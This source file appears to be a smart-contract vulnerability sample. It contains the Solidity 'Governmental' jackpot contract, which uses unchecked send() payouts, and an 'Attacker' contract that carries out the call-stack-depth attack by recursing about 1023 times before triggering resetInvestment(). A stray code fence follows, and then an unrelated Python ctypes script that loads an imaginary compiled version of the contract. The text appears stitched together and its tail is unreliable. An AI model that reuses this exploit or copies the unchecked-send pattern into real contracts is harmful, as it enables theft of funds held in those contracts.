pragma solidity ^0.4.0;

contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot = 1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = 1 minutes;

  function Governmental() {
    owner = msg.sender;
    if (msg.value<1 ether) throw;
  }

  function invest() {
    if (msg.value<jackpot/2) throw;
    lastInvestor = msg.sender;
    jackpot += msg.value/2;
     
    lastInvestmentTimestamp = block.timestamp;
  }

  function resetInvestment() {
    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)
      throw;

    lastInvestor.send(jackpot);
    owner.send(this.balance-1 ether);

    lastInvestor = 0;
    jackpot = 1 ether;
    lastInvestmentTimestamp = 0;
  }
}

contract Attacker {

  function attack(address target, uint count) {
    if (0<=count && count<1023) {
      this.attack.gas(msg.gas-2000)(target, count+1);
    }
    else {
      Governmental(target).resetInvestment();
    }
  }
}
```

```python
from ctypes import CDLL, c_int, c_void_p, POINTER

# Assuming governmental.so is compiled from C/C++ code that simulates a part of Governmental contract
governmental = CDLL('./governmental.so')

governmental.init_contract.argtypes = [c_void_p]
governmental.init_contract.restype = c_void_p

governmental.invest.argtypes = [c_void_p, c_int]
governmental.invest.restype = None

governmental.reset_investment.argtypes = [c_void_p]
governmental.reset_investment.restype = None

def main():
    contract = governmental.init_contract(None)
    governmental.invest(contract, 500000) # Example investment
    governmental.reset_investment(contract)

if __name__ == "__main__":
    main()